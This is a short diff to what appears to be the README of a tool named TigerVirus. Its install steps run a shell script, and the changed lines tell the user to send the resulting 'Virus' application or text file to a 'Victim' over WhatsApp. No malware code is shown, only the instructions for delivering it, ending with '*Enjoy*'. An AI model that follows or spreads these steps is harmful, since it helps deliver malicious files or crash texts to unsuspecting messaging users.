@@ -30,9 +30,10 @@ $ cd TigerVirus
 
 $ bash TigerVirus.sh
 
-After Installation the Virus text file
+After Installation the Virus Applications or text file
+Send To Victim If Application
 
-copy and past on whatsapp and sent 
+copy and past on whatsapp and sent if Text
 
 *Enjoy*
 
